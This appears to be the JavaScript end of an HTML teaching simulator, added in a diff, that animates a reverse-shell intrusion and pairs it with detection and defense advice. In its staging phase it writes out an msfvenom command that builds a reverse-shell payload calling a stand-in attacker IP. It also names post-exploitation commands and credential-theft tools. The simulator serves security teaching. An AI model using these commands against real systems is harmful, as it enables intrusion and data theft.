+    STATE.beacons++;
+    // Detection probability grows with beacons
+    STATE.detectProb = Math.min(95, 20 + STATE.beacons * 0.3 + (1 - STATE.obf) * 30 + (1 - STATE.jitter) * 20 + (STATE.port === 4444 ? 30 : 0));
+    if(STATE.detectProb > 70 && Math.random() < 0.02 && !STATE.detected){
+      STATE.detected = true;
+      addFeed('DETECT', 'Reverse shell DETECTED! EDR flagged: unusual outbound connection on port ' + STATE.port + ', periodic beacon every ' + STATE.interval + 's with ' + Math.round(STATE.jitter*100) + '% jitter. JA3 fingerprint matches known C2 profile. IR team notified.', 'warn');
+      STATE.nodes.find(n => n.id==='siem').glow = 1;
+    }
+  }
+
+  render();
+  updateBadges();
+  requestAnimationFrame(loop);
+}
+
+function render(){
+  const W = canvas.width, H = canvas.height;
+  ctx.clearRect(0,0,W,H);
+  const bg = ctx.createRadialGradient(W*0.5,H*0.4,50,W*0.5,H*0.4,W*0.7);
+  bg.addColorStop(0,'#0a0e1a'); bg.addColorStop(1,'#05070d');
+  ctx.fillStyle = bg; ctx.fillRect(0,0,W,H);
+
+  ctx.strokeStyle = 'rgba(30,41,59,0.4)'; ctx.lineWidth = 0.5;
+  for(let x=0;x<W;x+=40){ ctx.beginPath(); ctx.moveTo(x,0); ctx.lineTo(x,H); ctx.stroke(); }
+  for(let y=0;y<H;y+=40){ ctx.beginPath(); ctx.moveTo(0,y); ctx.lineTo(W,y); ctx.stroke(); }
+
+  drawZone(0.05*W, 0.08*H, 0.90*W, 0.75*H, 'C2 CHANNEL · ' + STATE.proto.toUpperCase(), '#a855f7');
+
+  const links = [
+    ['target','process'], ['process','firewall'], ['firewall','attacker'],
+    ['target','siem'], ['attacker','siem']
+  ];
+  links.forEach(pair => {
+    const na = STATE.nodes.find(n => n.id===pair[0]);
+    const nb = STATE.nodes.find(n => n.id===pair[1]);
+    if(!na || !nb) return;
+    ctx.beginPath();
+    ctx.moveTo(na.x, na.y);
+    ctx.lineTo(nb.x, nb.y);
+    ctx.strokeStyle = pair[1] === 'attacker' ? 'rgba(239,68,68,0.4)' : 'rgba(168,85,247,0.3)';
+    ctx.lineWidth = 1.5;
+    ctx.setLineDash(pair[0] === 'firewall' ? [4,4] : []);
+    ctx.stroke();
+    ctx.setLineDash([]);
+  });
+
+  STATE.events.forEach(e => {
+    if(e.type === 'packet'){
+      const px = e.from.x + (e.to.x - e.from.x) * e.t;
+      const py = e.from.y + (e.to.y - e.from.y) * e.t;
+      ctx.save();
+      ctx.shadowColor = e.color; ctx.shadowBlur = 10;
+      ctx.fillStyle = e.color;
+      ctx.beginPath(); ctx.arc(px, py, e.size, 0, Math.PI*2); ctx.fill();
+      if(e.label){
+        ctx.font = '8px "Courier New",monospace';
+        ctx.fillStyle = e.color; ctx.textAlign = 'center';
+        ctx.fillText(e.label, px, py - 10);
+      }
+      ctx.restore();
+    }
+  });
+
+  STATE.nodes.forEach(n => {
+    drawIcon(n.icon, n.x, n.y, n.color, n.glow, n.blink, n.label, n.ip);
+    if(n.id === 'process' && STATE.shells > 0){
+      ctx.save();
+      ctx.font = 'bold 9px "Courier New",monospace';
+      ctx.fillStyle = '#d8b4fe';
+      ctx.textAlign = 'center';
+      ctx.fillText('SHELL ACTIVE', n.x, n.y - 25);
+      ctx.restore();
+    }
+  });
+
+  if(STATE.phaseIdx > 0){
+    const s = SHELLS[STATE.shell];
+    ctx.save();
+    const ax = 0.05*W, ay = H - 150, aw = 0.55*W, ah = 120;
+    ctx.fillStyle = 'rgba(30,15,50,0.9)';
+    ctx.strokeStyle = '#a855f7';
+    ctx.lineWidth = 1.5;
+    ctx.fillRect(ax, ay, aw, ah);
+    ctx.strokeRect(ax, ay, aw, ah);
+    ctx.font = 'bold 10px "Courier New",monospace';
+    ctx.fillStyle = '#d8b4fe';
+    ctx.textAlign = 'left';
+    ctx.fillText('\u25B8 ' + s.title, ax + 8, ay + 16);
+    ctx.font = '9px "Courier New",monospace';
+    ctx.fillStyle = '#cbd5e1';
+    ctx.fillText('Language: ' + STATE.lang.toUpperCase() + ' | Protocol: ' + STATE.proto.toUpperCase() + ':' + STATE.port, ax + 8, ay + 36);
+    ctx.fillText('Interval: ' + STATE.interval + 's | Jitter: ' + Math.round(STATE.jitter*100) + '% | Obfuscation: ' + Math.round(STATE.obf*100) + '%', ax + 8, ay + 52);
+    ctx.fillText('Shells: ' + STATE.shells + ' | Beacons: ' + STATE.beacons + ' | Data: ' + STATE.dataExfil + ' MB', ax + 8, ay + 68);
+    ctx.fillStyle = '#fcd34d';
+    ctx.fillText('Detect probability: ' + Math.round(STATE.detectProb) + '%', ax + 8, ay + 84);
+    ctx.fillStyle = STATE.detected ? '#ef4444' : (STATE.killed ? '#fcd34d' : '#4ade80');
+    ctx.fillText('Detected: ' + (STATE.detected ? 'YES' : 'NO') + ' | Killed: ' + (STATE.killed ? 'YES' : 'NO'), ax + 8, ay + 100);
+    ctx.restore();
+  }
+
+  ctx.save();
+  ctx.font = '8px "Courier New",monospace';
+  ctx.fillStyle = 'rgba(100,116,139,0.6)';
+  ctx.textAlign = 'left';
+  ctx.fillText('Reverse shell: target initiates outbound — bypasses NAT/firewall', 12, H - 74);
+  ctx.fillText('Bind shell: target listens — usually blocked by inbound firewall', 12, H - 62);
+  ctx.fillText('Detection: JA3/JA3S fingerprint, beacon analysis, process anomaly', 12, H - 50);
+  ctx.fillText('Mitigation: egress allowlist, EDR, TLS inspection, NDR', 12, H - 38);
+  ctx.fillText('MITRE T1059 · T1071 · T1573 · T1008 · T1095', 12, H - 26);
+  ctx.restore();
+}
+
+function drawZone(x, y, w, h, label, color){
+  ctx.save();
+  ctx.strokeStyle = color; ctx.globalAlpha = 0.25; ctx.lineWidth = 1;
+  ctx.setLineDash([6,4]); ctx.strokeRect(x, y, w, h);
+  ctx.globalAlpha = 0.6;
+  ctx.font = 'bold 9px "Courier New",monospace';
+  ctx.fillStyle = color; ctx.textAlign = 'left';
+  ctx.fillText(label, x + 6, y + 14);
+  ctx.restore();
+}
+
+function updateBadges(){
+  document.getElementById('badgeShell').textContent = STATE.shell.toUpperCase();
+  document.getElementById('badgeC2').textContent = STATE.c2;
+  document.getElementById('badgeStatus').textContent = STATE.killed ? 'KILLED' : (STATE.shells > 0 ? 'ACTIVE' : (STATE.running ? 'CONNECTING' : 'IDLE'));
+  document.getElementById('badgeDetected').textContent = STATE.detected ? 'YES' : 'NO';
+
+  document.getElementById('mShellsVal').textContent = STATE.shells;
+  document.getElementById('mSessionVal').textContent = STATE.sessionTTL;
+  document.getElementById('mBeaconsVal').textContent = STATE.beacons;
+  document.getElementById('mDetectVal').textContent = Math.round(STATE.detectProb) + '%';
+  document.getElementById('mDataVal').textContent = STATE.dataExfil + ' MB';
+  document.getElementById('mJitterVal').textContent = Math.round(STATE.jitter*100) + '%';
+  document.getElementById('mRiskVal').textContent = STATE.risk;
+  document.getElementById('mDefenseVal').textContent = STATE.killed ? 'KILLED' : (STATE.detected ? 'DETECTED' : 'ACTIVE');
+
+  document.getElementById('mDetect').className = 'metric' + (STATE.detectProb > 70 ? ' bad' : STATE.detectProb > 40 ? ' warn' : '');
+  document.getElementById('mShells').className = 'metric purple';
+}
+
+function advancePhase(){
+  if(STATE.phaseIdx >= PHASES.length){
+    STATE.running = false;
+    return;
+  }
+  const phase = PHASES[STATE.phaseIdx];
+  PHASES.forEach((p,i) => {
+    const el = document.getElementById('shp-' + p);
+    if(!el) return;
+    el.className = 'sh-phase';
+    if(i < STATE.phaseIdx) el.classList.add('done');
+    else if(i === STATE.phaseIdx && STATE.running) el.classList.add('active');
+  });
+
+  const s = SHELLS[STATE.shell];
+
+  switch(phase){
+    case 'STAGE':
+      addFeed('STAGE', 'Staging payload: ' + s.title + '. ' + s.detail, 'info');
+      addCommandFeed('msfvenom -p linux/x64/shell_reverse_tcp LHOST=203.0.113.66 LPORT=' + STATE.port + ' -f raw -o shell.bin',
+        '[-] No platform was selected, choosing Msf::Module::Platform::Linux\n' +
+        '[-] No arch selected, selecting arch: x64\n' +
+        'Payload size: 74 bytes\n' +
+        'Final size of raw file: 74 bytes\n' +
+        'Saved as: shell.bin');
+      break;
+
+    case 'EXECUTE':
+      spawnPacket('target','process','#a855f7','EXEC',0.03);
+      addFeed('EXECUTE', 'Payload execution: ' + PAYLOADS[STATE.lang].substring(0, 80) + '... Process spawned as user www-data (or higher with privesc).', 'warn');
+      break;
+
+    case 'CALLBACK':
+      STATE.shells++;
+      spawnPacket('process','firewall','#a855f7','CALLBACK',0.03);
+      setTimeout(() => spawnPacket('firewall','attacker','#a855f7','CALLBACK',0.03), 300);
+      addFeed('CALLBACK', 'Callback initiated to ' + STATE.c2 + ' over ' + STATE.proto.toUpperCase() + '. Beacon interval: ' + STATE.interval + 's, jitter: ' + Math.round(STATE.jitter*100) + '%. Connection established.', 'error');
+      STATE.sessionTTL = '~5 min idle';
+      break;
+
+    case 'SHELL':
+      STATE.beacons += 2;
+      addFeed('SHELL', 'Interactive shell established. Attacker runs commands: id, whoami, uname -a, cat /etc/passwd, env, netstat. Next: post-exploitation (enumeration, privesc, lateral movement, persistence).', 'error');
+      addCommandFeed('whoami; id; uname -a',
+        'www-data\n' +
+        'uid=33(www-data) gid=33(www-data) groups=33(www-data)\n' +
+        'Linux target 5.15.0-91-generic #101-Ubuntu SMP x86_64 GNU/Linux');
+      break;
+
+    case 'PERSIST':
+      addFeed('PERSIST', 'Establishing persistence for the shell: cron entry + systemd service + SSH key. If one is removed, others survive reboot. Beacon survives EDR process kills via watchdog.', 'error');
+      break;
+
+    case 'EXFIL':
+      STATE.dataExfil += 247;
+      spawnPacket('target','attacker','#ef4444','DATA',0.03);
+      addFeed('EXFIL', 'Exfiltrating data: 247 MB uploaded to C2 over encrypted channel. Real-world: after achieving interactive shell, attackers typically run discovery (BloodHound, Seatbelt), collect credentials (Mimikatz, LaZagne), stage data, then exfiltrate over HTTPS/DNS/ICMP.', 'error');
+      addFeed('DEFENSE', 'Defense in depth against reverse shells: (1) Egress filtering — allowlist destinations (no direct internet for servers). (2) JA3/JA3S fingerprinting on egress (TLS handshake analysis). (3) Beacon detection — interval + jitter pattern anomalies in NDR. (4) EDR with behavioral detection — process spawning network, unusual parents (nginx → bash), encoded commands. (5) In-memory scanning (Meterpreter, Cobalt Strike beacons). (6) TLS inspection at egress proxy for known C2 profiles. (7) DNS monitoring — long/high-entropy queries for tunnels. (8) IMDSv2 for cloud (prevent SSRF-based shells). (9) Harden endpoints: disable unused interpreters (PowerShell Constrained Language, wscript, cscript), AppLocker. (10) Threat hunt for T1059/T1071 in telemetry.', 'ok');
+      break;
+  }
+  STATE.phaseIdx++;
+}
+
+function resetAll(){
+  STATE.running = false;
+  STATE.phaseIdx = 0;
+  STATE.shells = 0;
+  STATE.sessionTTL = '—';
+  STATE.beacons = 0;
+  STATE.detectProb = 0;
+  STATE.dataExfil = 0;
+  STATE.risk = 0;
+  STATE.detected = false;
+  STATE.killed = false;
+  STATE.events = [];
+  PHASES.forEach(p => { const el = document.getElementById('shp-' + p); if(el) el.className = 'sh-phase'; });
+  STATE.nodes.forEach(n => { n.glow = 0; });
+  addFeed('RESET', 'C2 state cleared.', 'info');
+  termWrite('reset --all\n[+] Sessions killed\n[+] Listeners closed');
+}
+
+document.getElementById('shellSelect').addEventListener('change', e => {
+  STATE.shell = e.target.value;
+  const s = SHELLS[STATE.shell];
+  addFeed('SHELL', 'Shell type: ' + s.title + '. ' + s.detail, 'warn');
+});
+
+document.getElementById('langSelect').addEventListener('change', e => {
+  STATE.lang = e.target.value;
+  addFeed('LANG', 'Payload language: ' + STATE.lang.toUpperCase() + '.', 'info');
+});
+
+document.getElementById('c2Input').addEventListener('input', e => { STATE.c2 = e.target.value; });
+document.getElementById('protoSelect').addEventListener('change', e => { STATE.proto = e.target.value; });
+document.getElementById('intervalInput').addEventListener('change', e => { STATE.interval = parseInt(e.target.value) || 60; });
+document.getElementById('portSelect').addEventListener('change', e => { STATE.port = parseInt(e.target.value); });
+
+document.getElementById('obfSlider').addEventListener('input', e => {
+  STATE.obf = parseInt(e.target.value) / 100;
+  document.getElementById('obfVal').textContent = e.target.value + '%';
+});
+document.getElementById('jitSlider').addEventListener('input', e => {
+  STATE.jitter = parseInt(e.target.value) / 100;
+  document.getElementById('jitVal').textContent = e.target.value + '%';
+});
+
+document.getElementById('startBtn').addEventListener('click', () => {
+  if(STATE.running) return;
+  STATE.running = true;
+  STATE.phaseIdx = 0;
+  STATE.shells = 0;
+  STATE.beacons = 0;
+  STATE.detectProb = 0;
+  STATE.dataExfil = 0;
+  STATE.detected = false;
+  STATE.killed = false;
+  STATE.nodes.forEach(n => { n.glow = 0; });
+  addFeed('CONNECT', 'Starting reverse shell: ' + SHELLS[STATE.shell].title + ' to ' + STATE.c2, 'warn');
+  const interval = setInterval(() => {
+    if(!STATE.running){ clearInterval(interval); return; }
+    advancePhase();
+    if(STATE.phaseIdx >= 6){ clearInterval(interval); STATE.running = false; }
+  }, 1200);
+});
+
+document.getElementById('stepBtn').addEventListener('click', () => {
+  if(!STATE.running){ STATE.running = true; STATE.phaseIdx = 0; }
+  advancePhase();
+});
+
+document.getElementById('resetBtn').addEventListener('click', resetAll);
+
+document.getElementById('detectBtn').addEventListener('click', () => {
+  const probability = STATE.detectProb;
+  if(Math.random() * 100 < probability){
+    STATE.detected = true;
+    addFeed('DETECT', 'Reverse shell DETECTED by EDR/NDR! Alert: outbound to ' + STATE.c2 + ' over ' + STATE.proto.toUpperCase() + '. JA3 mismatch, unusual process (nginx → bash), periodic beacon pattern. Contain via EDR isolation + firewall block.', 'warn');
+  } else {
+    addFeed('DETECT', 'Not detected by current controls. Detection probability was ' + Math.round(probability) + '%. Increase detection: JA3/JA3S fingerprinting, beacon analysis, egress proxy with TLS inspection, EDR behavioral rules.', 'error');
+  }
+});
+
+document.getElementById('killBtn').addEventListener('click', () => {
+  if(STATE.shells === 0){
+    addFeed('KILL', 'No active shells to kill.', 'warn');
+    return;
+  }
+  STATE.killed = true;
+  STATE.running = false;
+  addFeed('KILL', 'Session killed: EDR isolated target, firewall blocked C2 IP, memory scan removed beacon, persistence mechanisms enumerated + removed. WARNING: in real IR, do NOT kill without preserving evidence (pcap, process tree, memory dump, command history).', 'ok');
+  STATE.nodes.forEach(n => { n.glow = 0; });
+});
+
+document.getElementById('teachingToggle').addEventListener('click', function(){
+  const on = this.classList.toggle('active');
+  this.textContent = on ? '\uD83D\uDCD6 TEACHING: ON' : '\uD83D\uDCD6 TEACHING: OFF';
+});
+document.getElementById('voiceToggle').addEventListener('click', function(){
+  VOICE.enabled = !VOICE.enabled;
+  this.classList.toggle('active', VOICE.enabled);
+  this.textContent = VOICE.enabled ? '\uD83D\uDD0A VOICE: ON' : 'VOICE: OFF';
+});
+
+window.addEventListener('load', boot);
+</script>
+</body>
+</html>
